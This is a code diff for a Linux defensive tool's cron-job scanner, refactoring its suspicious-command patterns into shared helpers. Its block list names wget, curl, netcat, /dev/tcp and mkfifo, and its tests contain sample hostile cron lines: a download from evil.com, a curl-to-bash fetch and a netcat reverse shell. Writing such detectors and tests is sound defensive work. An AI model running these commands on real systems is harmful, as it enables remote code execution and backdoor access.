@@ -14,85 +14,17 @@ use crate::core::{
     DefenderContext, DefenderError, Finding, Result, Severity, Verdict, collect_users,
     require_root, try_clear_immutable,
 };
+use crate::core::scan::{suspicious_matches, references_untrusted_dir};
 
-/// A pattern that distinguishes cron-based persistence from routine jobs.
+/// Cron-specific patterns not covered by `core::scan::suspicious_matches`.
 struct CronPattern {
-    /// Short label shown in the context pane (e.g. "wget download").
     name: &'static str,
-    /// Substring to look for in the (lowercased) job line.
     needle: &'static str,
 }
 
-/// Patterns used to flag suspicious cron job commands.
-const SUSPICIOUS_PATTERNS: &[CronPattern] = &[
-    CronPattern {
-        name: "wget download",
-        needle: "wget",
-    },
-    CronPattern {
-        name: "curl download",
-        needle: "curl",
-    },
-    CronPattern {
-        name: "pipe to bash",
-        needle: "| bash",
-    },
-    CronPattern {
-        name: "pipe to sh",
-        needle: "| sh ",
-    },
-    CronPattern {
-        name: "tmp execution",
-        needle: "/tmp/",
-    },
-    CronPattern {
-        name: "shm execution",
-        needle: "/dev/shm/",
-    },
-    CronPattern {
-        name: "var/tmp execution",
-        needle: "/var/tmp/",
-    },
-    CronPattern {
-        name: "base64 decode",
-        needle: "base64 -d",
-    },
-    CronPattern {
-        name: "base64 decode",
-        needle: "base64 --decode",
-    },
-    CronPattern {
-        name: "netcat backdoor",
-        needle: "nc -",
-    },
-    CronPattern {
-        name: "tcp redirect",
-        needle: "/dev/tcp/",
-    },
-    CronPattern {
-        name: "mkfifo backdoor",
-        needle: "mkfifo",
-    },
-    CronPattern {
-        name: "python one-liner",
-        needle: "python -c",
-    },
-    CronPattern {
-        name: "python3 one-liner",
-        needle: "python3 -c",
-    },
-    CronPattern {
-        name: "perl one-liner",
-        needle: "perl -e",
-    },
-    CronPattern {
-        name: "nohup background",
-        needle: "nohup",
-    },
-    CronPattern {
-        name: "chmod +x",
-        needle: "chmod +x",
-    },
+const CRON_EXTRA_PATTERNS: &[CronPattern] = &[
+    CronPattern { name: "nohup background", needle: "nohup" },
+    CronPattern { name: "chmod +x", needle: "chmod +x" },
 ];
 
 /// Walk every user's crontab.  Suspicious entries are logged as evidence and
@@ -244,14 +176,22 @@ pub fn run(ctx: &DefenderContext) -> Result {
 /// Return the names of all suspicious patterns that match `job`.
 fn matched_patterns(job: &str) -> Vec<String> {
     let lower = job.to_lowercase();
-    SUSPICIOUS_PATTERNS
-        .iter()
-        .filter(|p| lower.contains(p.needle))
-        // deduplicate by name (e.g. two base64 patterns share a name)
-        .map(|p| p.name.to_string())
-        .collect::<std::collections::BTreeSet<_>>()
+    // Start with the shared behavioral patterns from core/scan.rs
+    let mut reasons: std::collections::BTreeSet<String> = suspicious_matches(job)
         .into_iter()
-        .collect()
+        .map(|s| s.to_string())
+        .collect();
+    // Also flag execution from untrusted directories
+    if references_untrusted_dir(job) {
+        reasons.insert("execution from untrusted directory".to_string());
+    }
+    // Add cron-specific extras not in core scan
+    for p in CRON_EXTRA_PATTERNS {
+        if lower.contains(p.needle) {
+            reasons.insert(p.name.to_string());
+        }
+    }
+    reasons.into_iter().collect()
 }
 
 /// Every line of one user's crontab, or empty if they have none.
@@ -308,31 +248,31 @@ mod tests {
     #[test]
     fn wget_download_is_flagged() {
         let patterns = matched_patterns("* * * * * wget http://evil.com/shell.sh -O /tmp/s");
-        assert!(patterns.contains(&"wget download".to_string()));
-        assert!(patterns.contains(&"tmp execution".to_string()));
+        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
+        assert!(patterns.iter().any(|p| p.contains("untrusted directory")));
     }
 
     #[test]
     fn pipe_to_bash_is_flagged() {
         let patterns = matched_patterns("*/5 * * * * curl http://c2/payload | bash");
-        assert!(patterns.contains(&"curl download".to_string()));
-        assert!(patterns.contains(&"pipe to bash".to_string()));
+        assert!(patterns.iter().any(|p| p.contains("fetches remote content")));
+        assert!(patterns.iter().any(|p| p.contains("shell")));
     }
 
     #[test]
     fn mkfifo_reverse_shell_is_flagged() {
         let patterns = matched_patterns("* * * * * mkfifo /tmp/f; nc -e /bin/sh 10.0.0.1 4444");
-        assert!(patterns.contains(&"mkfifo backdoor".to_string()));
-        assert!(patterns.contains(&"netcat backdoor".to_string()));
+        assert!(patterns.iter().any(|p| p.contains("named pipe")));
+        assert!(patterns.iter().any(|p| p.contains("netcat")));
     }
 
     #[test]
-    fn pattern_names_are_deduplicated() {
-        // Two base64 patterns have the same name; should only appear once.
+    fn base64_is_flagged_once() {
+        // Two base64 patterns in core/scan.rs share a reason; should deduplicate.
         let patterns = matched_patterns("* * * * * echo dGVzdA== | base64 -d | base64 --decode");
         let count = patterns
             .iter()
-            .filter(|p| p.as_str() == "base64 decode")
+            .filter(|p| p.contains("base64"))
             .count();
         assert_eq!(count, 1);
     }
